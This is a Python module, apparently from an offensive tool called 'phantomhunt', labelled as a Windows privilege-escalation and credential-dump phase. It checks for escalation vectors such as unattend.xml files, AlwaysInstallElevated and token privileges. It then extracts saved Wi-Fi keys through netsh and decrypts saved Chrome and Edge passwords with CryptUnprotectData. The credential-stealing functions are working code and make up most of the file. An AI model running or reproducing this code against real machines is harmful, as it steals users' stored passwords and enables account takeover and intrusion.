# phantomhunt/modules/phase2.py
import os
import subprocess
import sqlite3
import win32crypt
import json
from rich.console import Console
from rich.table import Table

console = Console()


def run_cmd(command):
    try:
        return subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
    except:
        return ""


def check_priv_esc():
    console.print("\n[bold red]Checking Local Privilege Escalation Vectors...[/]")
    vulns = []

    table = Table(title="Privilege Escalation Checks", show_header=True)
    table.add_column("Vulnerability")
    table.add_column("Status")
    table.add_column("Details")
    # console.print(table)



    # 1. Unattended Install files
    if os.path.exists(r"C:\Windows\Panther\unattend.xml") or os.path.exists(
            r"C:\Windows\Panther\Unattend\unattend.xml"):
        vulns.append("Unattended Install")
        table.add_row("Unattended Install Files", "[red]VULNERABLE[/]", "Clear-text passwords possible")

    # 2. AlwaysInstallElevated
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\Installer")
        val, _ = winreg.QueryValueEx(key, "AlwaysInstallElevated")
        if val == 1:
            vulns.append("AlwaysInstallElevated")
            table.add_row("AlwaysInstallElevated", "[red]VULNERABLE[/]", "MSI runs as SYSTEM")
    except:
        pass

    # 3. Juicy Potato / Rotten Potato hints
    output = run_cmd('powershell "Get-Service | Where-Object {$_.Name -like \'*spool*\'}"')
    if "Spooler" in output and "Running" in output:
        table.add_row("Print Spooler Running", "[yellow]Possible[/]", "PrintNightmare / JuicyPotato")
        vulns.append({"name": "Print Spooler Running", "status": "Possible", "details": "PrintNightmare / JuicyPotato"})
    # 4. SeImpersonate / SeAssignPrimaryToken
    output = run_cmd('whoami /priv')
    if "SeImpersonatePrivilege" in output or "SeAssignPrimaryTokenPrivilege" in output:
        if "Enabled" in output:
            vulns.append("Token Impersonation")
            table.add_row("Token Privileges", "[red]VULNERABLE[/]", "Juicy/Rotten Potato possible")

    # Add more checks later (we will)

    if not vulns:
        table.add_row("All Checks", "[green]No obvious LPE found[/]", "Still need manual review")

    console.print(table)
    return vulns


def dump_wifi_passwords():
    console.print("\n[bold blue]Dumping Saved Wi-Fi Passwords...[/]")
    try:
        profiles = subprocess.check_output("netsh wlan show profiles", text=True)
        profile_names = [line.split(":")[1].strip() for line in profiles.split("\n") if "All User Profile" in line]

        table = Table(title="Wi-Fi Passwords")
        table.add_column("SSID")
        table.add_column("Password")

        # ─────── CHANGE 1 ───────
        # Added counter BEFORE the loop (so it counts ALL profiles with passwords)
        wifi_count = 0

        for profile in profile_names:
            result = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', text=True)
            for line in result.split("\n"):
                if "Key Content" in line:
                    password = line.split(":")[1].strip()
                    table.add_row(profile, password)

                    # ─────── CHANGE 2 ───────
                    # Increment counter only when a password is actually found
                    wifi_count += 1

        console.print(table)

        # ─────── CHANGE 3 ───────
        # Return the real count instead of len(profile_names)
        return wifi_count

    except:
        console.print("[red]Failed to dump Wi-Fi (run as admin?)[/]")
        return 0  # Return 0 on failure


def dump_chrome_passwords():
    console.print("\n[bold magenta]Dumping Chrome/Edge Saved Passwords...[/]")
    paths = [
        os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data"),
        os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\Login Data")
    ]
    found = False
    table = Table(title="Browser Passwords")
    table.add_column("Site")
    table.add_column("Username")
    table.add_column("Password")

    browser_count = 0  # added
    for path in paths:
        if os.path.exists(path):
            try:
                conn = sqlite3.connect(path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

                for row in cursor.fetchall():
                    url = row[0]
                    user = row[1]
                    encrypted = row[2]
                    decrypted = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode()
                    table.add_row(url, user, decrypted)
                    browser_count += 1
                    found = True
                conn.close()
            except:
                pass

    if found:
        console.print(table)
        return browser_count
    else:
         console.print("[yellow]No saved passwords found[/]")
         return 0


# def phase2():
#     console.print("\n[bold cyan]=== PHASE 2: PRIVILEGE ESCALATION + CREDENTIAL DUMP ===[/]")
#     check_priv_esc()
#     dump_wifi_passwords()
#     dump_chrome_passwords()
def phase2():
    console.print("\n[bold cyan]=== PHASE 2: PRIVILEGE ESCALATION + CREDENTIAL DUMP ===[/]")

    priv_findings = check_priv_esc()

    try:
        wifi_count = dump_wifi_passwords()
    except Exception as e:
        console.print(f"[red]Wi-Fi dump failed: {e}[/]")
        wifi_count = 0

    try:
        browser_count = dump_chrome_passwords()
    except Exception as e:
        console.print(f"[red]Browser dump failed: {e}[/]")
        browser_count = 0

    return {
        "priv_findings": priv_findings,
        "wifi_count": wifi_count,
        "browser_count": browser_count
    }#report updation



if __name__ == "__main__":
    phase2()